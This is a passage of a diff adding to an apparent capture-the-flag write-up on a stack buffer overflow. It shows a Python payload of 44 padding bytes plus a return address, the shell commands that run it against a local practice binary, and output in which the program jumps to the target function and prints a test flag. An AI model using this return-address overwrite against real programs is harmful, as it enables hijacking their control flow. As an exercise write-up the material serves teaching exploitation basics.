@@ -184,3 +184,28 @@ Creating the payload:
 import sys
 sys.stdout.buffer.write(b"A"*44 + bytes.fromhex('f6910408'))
 ```
+
+```
+[~/Desktop] 
+$ python create_payload.py > payload 
+
+[~/Desktop] 
+$ ./vuln < payload 
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+Please create 'flag.txt' in this directory with your own debugging flag.
+
+[~/Desktop] 
+$ echo "testflag" > flag.txt
+
+[~/Desktop] 
+$ ./vuln < payload 
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+testflag
+Segmentation fault (core dumped)
+```
+
+It works locally!
+
+You can also use this function `from pwn import p32` to avoid manually converting to little endian.
